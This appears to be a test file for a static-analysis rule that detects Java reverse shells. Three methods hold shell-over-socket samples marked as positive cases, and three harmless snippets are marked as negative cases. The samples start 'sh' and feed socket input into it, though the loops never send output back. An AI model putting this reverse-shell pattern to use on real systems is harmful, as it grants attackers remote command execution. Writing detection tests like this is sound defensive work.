// A process with a redirected error stream coupled to a socket loop that
// shuttles bytes both ways is the classic reverse shell. The rule reports the
// socket half, so the marker sits above it; a process or a socket on its own
// is fine.
import java.io.InputStream;
import java.net.Socket;

public class JavaReverseShell {
    void flag(String host, int port) throws Exception {
        Process p = new ProcessBuilder("sh").redirectErrorStream(true).start();
        // ruleid: java-reverse-shell
        Socket s = new Socket(host, port);
        InputStream si = s.getInputStream();
        java.io.OutputStream po = p.getOutputStream();
        java.io.OutputStream so = s.getOutputStream();
        while (!s.isClosed()) {
            while (si.available() > 0) po.write(si.read());
            so.flush();
        }
        p.destroy();
    }

    void flagAgain(String host, int port) throws Exception {
        Process p = new ProcessBuilder("sh").redirectErrorStream(true).start();
        // ruleid: java-reverse-shell
        Socket s = new Socket(host, port);
        InputStream si = s.getInputStream();
        java.io.OutputStream po = p.getOutputStream();
        java.io.OutputStream so = s.getOutputStream();
        while (!s.isClosed()) {
            while (si.available() > 0) po.write(si.read());
            so.flush();
        }
        p.destroy();
    }

    void flagThird(String host, int port) throws Exception {
        Process proc = new ProcessBuilder("sh").redirectErrorStream(true).start();
        // ruleid: java-reverse-shell
        Socket sock = new Socket(host, port);
        InputStream in = sock.getInputStream();
        java.io.OutputStream pout = proc.getOutputStream();
        java.io.OutputStream sout = sock.getOutputStream();
        while (!sock.isClosed()) {
            while (in.available() > 0) pout.write(in.read());
            sout.flush();
        }
        proc.destroy();
    }

    void safeProcessOnly() throws Exception {
        Process p = new ProcessBuilder("ls").redirectErrorStream(true).start();
        // ok: java-reverse-shell
        p.waitFor();
        p.destroy();
    }

    void safeSocketOnly(String host, int port) throws Exception {
        // ok: java-reverse-shell
        Socket s = new Socket(host, port);
        s.close();
    }

    void safePlain(String host, int port) throws Exception {
        Socket s = new Socket(host, port);
        // ok: java-reverse-shell
        System.out.println(s.isClosed());
        s.close();
    }
}
